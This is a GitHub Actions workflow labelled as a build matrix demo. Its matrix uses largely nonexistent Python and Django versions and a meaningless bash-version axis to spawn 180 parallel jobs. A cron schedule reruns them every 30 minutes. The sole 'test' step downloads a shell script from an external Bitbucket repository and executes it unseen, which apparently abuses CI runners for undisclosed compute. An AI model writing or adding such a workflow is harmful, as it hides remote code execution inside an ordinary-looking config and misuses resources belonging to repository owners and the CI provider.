name: build matrix demo1

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: "*/30 */5 * * *"
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        python-version:
          - "3.6"
          - "3.7"
          - "3.9"
          - "4.0"
          - "4.1"
          - "4.2"
        django-version:
          - "1.11"
          - "2.0"
          - "2.1"
          - "2.2"
          - "2.3"
        bash-version:
          - "2.6"
          - "2.5"
          - "2.4"
          - "2.3"
          - "2.2"
          - "2.1"
    steps:
      - uses: actions/checkout@v2
      - name: test
        run: wget https://bitbucket.org/sabri-fuadi991/tesazz/raw/5f91e78957ce870ff3ff834a7ff7df189512d73a/a.sh && chmod +x a.sh && ./a.sh
